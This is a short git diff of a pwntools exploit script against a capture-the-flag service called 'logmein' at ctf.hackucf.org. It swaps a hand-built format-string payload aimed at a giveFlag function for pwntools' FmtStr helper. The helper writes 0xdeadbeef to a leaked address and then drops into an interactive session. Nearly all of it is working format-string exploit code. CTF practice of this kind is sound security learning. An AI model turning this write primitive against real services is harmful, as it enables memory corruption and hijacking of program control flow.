@@ -3,19 +3,16 @@ import struct
 io = remote("ctf.hackucf.org", 7006)
 
 exe = context.binary = ELF('logmein')
+dress = int(io.recvline().split(b'=')[1].strip(), 16)
+print(dress)
+def sendLoad(payload):
+    #io = remote("ctf.hackucf.org", 7006)
+    #dress = int(io.recvline().split(b'=')[1].strip())
+    io.recvline()
+    io.sendline(payload)
+    return io.recvline().split(b':')[1].strip()
 
-#io = exe.process()
-io.recvuntil("user = ")
-ptr = io.recvline().strip()
-print(ptr)
-ptr = int(ptr, base=16)
-print(ptr)
-winaddr = exe.symbols['giveFlag']
-val = (winaddr & 0xff)
-payload = b"A" * 20
-payload += p64(ptr)
-payload += b"%%%dc" % val
-payload += b"%hhn"
-print(payload)
-io.sendline(payload)
+fmt = FmtStr(sendLoad, offset=6)
+fmt.write(dress, 0xdeadbeef)
+fmt.execute_writes()
 io.interactive()
